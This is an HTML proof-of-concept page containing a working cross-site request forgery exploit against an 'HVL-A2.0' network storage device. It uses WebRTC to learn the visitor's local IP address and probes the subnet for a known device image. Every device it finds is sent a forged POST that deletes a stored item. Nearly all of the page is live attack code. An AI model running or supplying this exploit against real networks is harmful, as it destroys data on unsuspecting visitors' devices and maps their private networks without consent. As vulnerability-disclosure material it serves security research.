<!DOCTYPE html>
<html>
<head>
	<title>HVL-A2.0 CSRF PoC w/ WebRTC - Delete item -</title>
</head>
<body>
  <!--
    This PoC is based on https://gist.github.com/venoms/5b5437e25e0bf3b49d0a

    I modified the following points:
    - Replaced foundNAS() to exploit()
    - Changed *src* attribute of *el* element
    - Added function appendElementAsLog(), and replaced output.innerText to appendElementAsLog()
    - Deleted or modified some comments, and arranged some indents

    Tested this PoC on Firefox and Chrome on Windows 8.1.
    - Mozilla Firefox 44.0.2
    - Google Chrome 48.0.2564.116 m
  -->
	<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
	<div id="output"></div>
	<script>
		var output = document.getElementById("output");

    //stolen from https://github.com/diafygi/webrtc-ips
    //under the MIT license
    //get the IP addresses associated with an account
    function getIPs(callback){
     	var ip_dups = {};
      //compatibility for firefox and chrome
      var RTCPeerConnection = window.RTCPeerConnection
      || window.mozRTCPeerConnection
      || window.webkitRTCPeerConnection;
      var useWebKit = !!window.webkitRTCPeerConnection;
      //bypass naive webrtc blocking using an iframe
      if(!RTCPeerConnection){
          //NOTE: you need to have an iframe in the page right above the script tag
          //
          //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
          //<script>...getIPs called in here...
          //
          var win = iframe.contentWindow;
          RTCPeerConnection = win.RTCPeerConnection
          || win.mozRTCPeerConnection
          || win.webkitRTCPeerConnection;
          useWebKit = !!win.webkitRTCPeerConnection;
      }
      //minimal requirements for data connection
      var mediaConstraints = {
      	optional: [{RtpDataChannels: true}]
      };
      var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
      //construct a new RTCPeerConnection
      var pc = new RTCPeerConnection(servers, mediaConstraints);
      function handleCandidate(candidate){
          //match just the IP address
          var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
          var ip_addr = ip_regex.exec(candidate)[1];
          //remove duplicates
          if(ip_dups[ip_addr] === undefined)
          	callback(ip_addr);
          ip_dups[ip_addr] = true;
      }
      //listen for candidate events
      pc.onicecandidate = function(ice){
          //skip non-candidate events
          if(ice.candidate)
          	handleCandidate(ice.candidate.candidate);
      };
      //create a bogus data channel
      pc.createDataChannel("");
      //create an offer sdp
      pc.createOffer(function(result){
          //trigger the stun server request
          pc.setLocalDescription(result, function(){}, function(){});
      }, function(){});
      //wait for a while to let everything done
      setTimeout(function(){
          //read candidate info from local description
          var lines = pc.localDescription.sdp.split('\n');
          lines.forEach(function(line){
          	if(line.indexOf('a=candidate:') === 0)
          		handleCandidate(line);
          });
      }, 1000);
    }

  function appendElementAsLog(log){
  	var p1 = document.createElement("p");
    p1.textContent = log;
    output.appendChild(p1);
  }

  function exploit(ip) {
    appendElementAsLog("Found HVL-A2.0 on " + ip + ". Do exploit()!");
    var xhr = new XMLHttpRequest();
    var postdata = 'id=FS-6411';
    xhr.open('POST', 'http://' + ip + ':55247/dms/transfer_tool/api/remove', 'true');
    xhr.onreadystatechange = function(){};
    xhr.send(postdata);
  }

  var groupSize = 50;

  // Using STUN, we locate the local ip address of the user
  // we make sensible guesses that the HVL-A2.0 is in the same simple local network
  getIPs(function(ip){
      //local IPs
      if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
      	// output.innerText += "Found IP " + ip + "\n"
        appendElementAsLog("Found IP " + ip)
      	// shotgun this ip
      	var pre = /^([\d\.]+\.)\d+$/.exec(ip)[1];

      	// output.innerText += "Searching " + pre + "*\n"
        appendElementAsLog("Searching " + pre + "*")
        var i = 1, ed = 0;
      	//try a block of 50 IP guesses
      	var sweep = function() {
      		ed = i + groupSize;
          if (ed > 254) ed = 255;
      		var donect = 0;
      		var done = function() {
      			donect += 1;
      			if (i > 254) return;
      			if (donect == groupSize) sweep();
      			// console.log(i);
      		}
      		// output.innerText += "Searching " + pre + i + "-" + ed + "\n"
          appendElementAsLog("Searching " + pre + i + "-" + ed)
      		for(;i<ed;i++) {
      			var el = document.createElement("img");
      			var n = i;
      			el.setAttribute("style", "width:1em; height:1em;display:inline;border:1px solid red");

      			el.addEventListener("load", function(){
      				done();
      				this.setAttribute("style", "display:block");
      				exploit(/(?:\d+\.){3}.\d+/g.exec(this.src)[0]);
      			});

      			el.addEventListener("error", function() {
      				done();
      				this.parentNode.removeChild(this);
      			});
      			// el.setAttribute("src", "http://" + pre + i + "/img/common/forlink/header-logo.gif");
      			el.setAttribute("src", "http://" + pre + i + ":55247/dms/doc/transfer_tool/assets/img/btn_delete_m-over.png");

      			document.body.appendChild(el);
      		}
      	}
      	sweep();
      }
  });
  </script>
</body>
</html>
